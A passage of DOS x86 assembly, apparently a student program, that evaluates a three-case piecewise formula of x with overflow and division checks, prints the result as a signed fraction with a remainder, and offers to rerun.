    CONVERT_FINISH:      
                         MOV    AX, BX
                         CALL   CHECK_RANGE
                         POP    DX
                         POP    CX
                         POP    BX
                         MOV    BX, AX
                         POP    AX
                         RET
CONVERT ENDP
RET_PROC PROC
                         CALL   START
RET_PROC ENDP
FUNC PROC
                         XOR    AX, AX
                         MOV    AX, xvalue

                         CMP    AX, 10
                         JL     CASE_LESS_THAN_10
                         JE     CASE_EQUAL_10
                         JG     CASE_GREATER_THAN_10

    CASE_LESS_THAN_10:   
    ; Calculate Z = x - 1
                         MOV    AX, xvalue
                         SUB    AX, 1
                         MOV    result, AX
                         MOV    remainder, 0
                         JMP    END_FUNC

    CASE_EQUAL_10:       
    ; Calculate Z = (3x^2 + 4) / (x - 2)
    ; First calculate x^2
                         MOV    AX, xvalue
                         MUL    xvalue                        ; DX:AX = x^2
    
    ; Calculate 3x^2
                         MOV    BX, 3
                         MUL    BX                            ; DX:AX = 3x^2
    
    ; Add 4: AX = 3x^2 + 4
                         ADD    AX, 4
    
                         MOV    numerator, AX
    
    ; Calculate denominator: (x-2)
                         MOV    BX, xvalue
                         SUB    BX, 2
                         MOV    denominator, BX
    
    ; Perform division
                         MOV    AX, numerator
                         CWD                                  ; Convert word to double word for division
                         DIV    denominator
                         MOV    result, AX
                         MOV    remainder, DX
                         JMP    END_FUNC

    CASE_GREATER_THAN_10:
    ; Calculate Z = (7x^2 - 56) / (2x - 5)
                         MOV    AX, xvalue
                         MOV    temp_reg, AX                  ; Store x in temp_reg
    
                         MOV    AX, xvalue
                         MUL    xvalue                        ; DX:AX = x^2
    
                         CMP    DX, 0
                         JNE    CALC_OVERFLOW

                         CMP    AX, 4681                      ; 4681 = floor(32767 / 7)
                         JG     CALC_OVERFLOW
    ; Calculate 7x^2
                         MOV    BX, 7
                         MUL    BX                            ; DX:AX = 7x^2

    ; Check for overflow
                         CMP    DX, 0
                         JNE    CALC_OVERFLOW
    
    ; Subtract 56: AX = 7x^2 - 56
                         SUB    AX, 56
                         MOV    numerator, AX
    
    ; Calculate denominator: (2x-5)
                         MOV    AX, temp_reg                  ; Retrieve x from temp_reg
                         MOV    BX, 2
                         MUL    BX                            ; AX = 2x
                         SUB    AX, 5                         ; AX = 2x - 5
                         MOV    denominator, AX
    
    ; Check if denominator is 0
                         CMP    AX, 0
                         JE     RANGE_ERROR_FUNC
    
    ; Perform division - ensure signs are handled correctly
                         MOV    AX, numerator
                         MOV    BX, denominator
    
    ; Check if numerator is negative
                         CMP    AX, 0
                         JGE    CHECK_DENOM_SIGN
    
    ; Numerator is negative
                         NEG    AX
                         XOR    SI, SI                        ; SI=0 means positive result initially
                         INC    SI                            ; SI=1 means need to negate result
                         JMP    PERFORM_DIV
    
    CHECK_DENOM_SIGN:    
                         XOR    SI, SI                        ; SI=0 means positive result
    
    ; Check if denominator is negative
                         CMP    BX, 0
                         JGE    PERFORM_DIV
    
    ; Denominator is negative
                         NEG    BX
                         INC    SI                            ; Toggle result sign
    
    PERFORM_DIV:         
                         MOV    numerator, AX                 ; Update with absolute values
                         MOV    denominator, BX
    
    ; Perform division with absolute values
                         CWD                                  ; Convert word to double word for division
                         DIV    BX
                         MOV    result, AX
                         MOV    remainder, DX
    
    ; Apply sign if needed
                         CMP    SI, 0
                         JE     END_FUNC
                         NEG    result                        ; Negate result if signs were different
                         NEG    remainder                     ; Negate remainder too when result is negative
    
                         JMP    END_FUNC

    CALC_OVERFLOW:       
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET overflow_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START

    END_FUNC:            
                         RET

    RANGE_ERROR_FUNC:    
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET range_err
                         MOV    AH, 9
                         INT    21h
                         JMP    START
FUNC ENDP
PRINTING PROC
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET out_msg
                         MOV    AH, 9
                         INT    21h
                         MOV    AX, remainder
                         CMP    AX, 0
                         JNE    PRINT_FRACTION
                         MOV    AX, result
                         CMP    AX, 0
                         JGE    PRINT_MAIN_NUMBER
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, result
                         NEG    AX
    PRINT_MAIN_NUMBER:   
                         CALL   PRINT_NUM
                         JMP    END_PRINTING
    PRINT_FRACTION:      
                         MOV    AX, numerator
                         CMP    AX, 0
                         JGE    PRINT_NUMERATOR
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, numerator
                         NEG    AX
    PRINT_NUMERATOR:     
                         CALL   PRINT_NUM
                         MOV    DL, '/'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, denominator
                         CMP    AX, 0
                         JGE    PRINT_DENOMINATOR
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, denominator
                         NEG    AX
    PRINT_DENOMINATOR:   
                         CALL   PRINT_NUM
                         MOV    DL, ' '
                         MOV    AH, 2
                         INT    21h
                         MOV    DL, '='
                         INT    21h
                         MOV    DL, ' '
                         INT    21h
                         MOV    AX, result
                         CMP    AX, 0
                         JGE    PRINT_RES_NUMBER
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, result
                         NEG    AX
    PRINT_RES_NUMBER:    
                         CALL   PRINT_NUM
                         MOV    DX, OFFSET reminder_msg
                         MOV    AH, 9
                         INT    21h
                         MOV    AX, remainder
                         CMP    AX, 0
                         JL     NEG_REM
                         CALL   PRINT_NUM
                         JMP    END_PRINTING
    NEG_REM:             
                         MOV    DL, '-'
                         MOV    AH, 2
                         INT    21h
                         MOV    AX, remainder
                         NEG    AX
                         CALL   PRINT_NUM
    END_PRINTING:        
                         RET
PRINTING ENDP
PRINT_NUM PROC
                         PUSH   result
                         PUSH   CX
                         PUSH   DX
                         XOR    CX, CX
                         MOV    BX, 10
    CONVERT_TO_STR:      
                         XOR    DX, DX
                         DIV    BX
                         ADD    DL, '0'
                         PUSH   DX
                         INC    CX
                         TEST   AX, AX
                         JNZ    CONVERT_TO_STR
    PRINT_LOOP:          
                         POP    DX
                         MOV    AH, 2
                         INT    21h
                         LOOP   PRINT_LOOP
                         POP    DX
                         POP    CX
                         POP    result
                         RET
PRINT_NUM ENDP
END_PROGRAM PROC
                         MOV    DX, OFFSET newline
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET end_msg
                         MOV    AH, 9
                         INT    21h
                         MOV    DX, OFFSET menuhold
                         MOV    AH, 0Ah
                         INT    21h
                         MOV    AL, menuhold+2
                         CMP    AL, 'y'
                         JE     RETURN
                         CMP    AL, 'n'
                         JE     EXIT_PROGRAM
                         MOV    DX, OFFSET err_msg
                         MOV    AH, 9
                         INT    21h
                         JMP    END_PROGRAM
    EXIT_PROGRAM:        
                         MOV    AH, 4Ch
                         INT    21h
    RETURN:              
                         XOR    AX, AX
                         XOR    BX, BX
                         XOR    CX, CX
                         XOR    DX, DX
                         XOR    SI, SI
                         MOV    result, 0
                         MOV    remainder, 0
                         MOV    numerator, 0
                         MOV    denominator, 0
                         MOV    sign_flag, 0
                         CALL   RET_PROC
END_PROGRAM ENDP
CODE ENDS
END START"
